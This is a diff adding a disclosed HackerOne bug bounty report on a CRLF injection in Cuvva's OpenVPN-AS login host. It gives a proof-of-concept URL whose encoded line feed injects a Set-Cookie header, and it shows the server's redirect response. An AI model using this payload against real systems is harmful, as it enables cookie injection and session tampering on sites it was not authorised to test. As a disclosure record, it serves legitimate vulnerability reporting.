@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/231508
+WeaknessName:CRLF Injection
+Reporter:https://hackerone.com/cyriac
+ReportedTo:Cuvva(cuvva)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:26.05.2017 18:28:48
+
+Summary:
+
+Hi team,
+
+Found a CRLF injection in vpn.corp.cuvva.com
+
+*Poc*
+
+`https://vpn.corp.cuvva.com/__session_start__/%0aSet-Cookie:NEW_COOKIE123`
+
+
+*Response:*
+
+```
+HTTP/1.1 302 Found
+Date: Wed, 24 May 2017 18:13:57 GMT
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Location: https://vpn.corp.cuvva.com/
+Set-Cookie:NEW_COOKIES
+Server: OpenVPN-AS
+Content-Length: 59
+
+
+<html>
+    <body>
+    <p>REDIRECT</p>
+    </body>
+</html>
+```
+
+{F187794}
